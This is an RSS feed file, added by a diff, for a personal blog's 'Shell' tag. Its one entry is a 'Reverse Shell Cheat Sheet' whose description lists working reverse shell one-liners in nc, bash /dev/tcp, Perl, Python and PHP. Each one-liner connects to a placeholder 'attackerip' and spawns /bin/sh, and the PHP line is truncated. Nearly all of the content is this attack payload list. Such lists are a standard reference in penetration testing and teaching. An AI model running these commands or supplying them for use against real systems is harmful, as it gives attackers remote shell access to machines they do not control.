@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Shell on WhereIsMyMind</title>
+    <link>https://hare001.github.io/tags/shell/</link>
+    <description>Recent content in Shell on WhereIsMyMind</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 30 Jun 2020 17:22:05 +0800</lastBuildDate>
+    
+	<atom:link href="https://hare001.github.io/tags/shell/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Reverse Shell Cheat Sheet</title>
+      <link>https://hare001.github.io/2020/reverse-shell-cheat-sheet/</link>
+      <pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate>
+      
+      <guid>https://hare001.github.io/2020/reverse-shell-cheat-sheet/</guid>
+      <description>利用 nc 监听端口 nc -lvp 2333 nc 版本： nc -e /bin/sh attackerip 2333 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip 2333 &amp;gt;/tmp/f nc attackerip 8888|/bin/sh|nc attackerip 9999 Bash 版本： bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 0&amp;gt;&amp;amp;1 bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 &amp;lt;&amp;amp;2 exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/2333;cat &amp;lt;&amp;amp;5|while read line;do $line &amp;gt;&amp;amp;5 2&amp;gt;&amp;amp;1;done 0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196 mknod backpipe p; nc attackerip 2333 0&amp;lt;backpipe | /bin/bash 1&amp;gt;backpipe 2&amp;gt;backpipe Perl 版本: perl -e &#39;use Socket;$i=&amp;quot;attackerip&amp;quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39; Python 版本： python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;attackerip&amp;quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39; php 版本： php -r &#39;$sock=fsockopen(&amp;quot;attackerip&amp;quot;,2333);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3</description>
+    </item>
+    
+  </channel>
+</rss>
